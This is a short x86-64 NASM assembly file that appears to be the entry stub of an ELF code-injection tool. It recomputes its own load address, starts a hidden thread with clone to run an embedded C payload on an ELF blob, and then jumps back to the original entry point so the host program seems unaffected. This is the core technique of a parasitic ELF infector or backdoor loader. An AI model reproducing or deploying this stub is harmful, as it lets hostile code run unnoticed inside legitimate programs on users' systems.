BITS 64

[list -]
%include "unistd.inc"
%include "sys/sched.inc"
%include "sys/mman.inc"

	%define THREAD_FLAGS    CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_PARENT|CLONE_THREAD|CLONE_IO
%define STACK_SIZE      (4096 * 1024)
	%define MAX_LINES       10000                  ;number of output lines before exiting
	[list +]


%macro BaseAddr 0
	push $
	call getBaseAddr
%endmacro


%macro OFFSET 0
	push $
	call getOffsetAddr
%endmacro

	jmp ENTRY

ENTRY:

	push        rbp
	mov         rbp , rsp
	sub         rsp , 0x40

	BaseAddr
	mov         [rbp - 0x08] , rax ; get current program base address

	OFFSET
    mov         [rbp - 0x10] , rax ; get the program current offset on memory , offset address is entry point relative to base address offset


    ; use fork
    ;mov         rax , 57
    ;syscall
    ;cmp         rax , 0
    ;je          clangThread

    ;use clone
    mov         rdi , clangThread
    add         rdi , [rbp - 0x10]
    call        threadCreate

    ; recalculate the original entry point
	mov         rax , [rbp - 0x08]
	add         rax , ORIGIN_ENTER
	leave
	jmp         rax


clangThread:

	mov         rsi , FILESIZE  ; file size
	mov         rdi , ELF       ; elf begin address , ELF flag generated by tool chains

	OFFSET
	add         rdi , rax
    ; call C language
	call        Clang


; get the PE base address on runtime
; base address value store in eax
getBaseAddr:
	mov         rax , [rsp]
	sub         rax , [rsp + 0x08]
	sub         rax , NEW_ENTER+0x0A;new entry point +10
	ret         8


; Get memory offset
getOffsetAddr:
    mov         rax , [rsp]
    sub         rax , [rsp + 0x08]
    sub         rax , 0x0A
    ret         8

threadCreate:
	push    rdi
	call    stackCreate
	lea	    rsi, [rax + STACK_SIZE - 8]
	pop	    qword [rsi]
	syscall clone, THREAD_FLAGS
	ret

stackCreate:
	syscall mmap, 0, STACK_SIZE,PROT_WRITE | PROT_READ,MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN,0,0
	ret
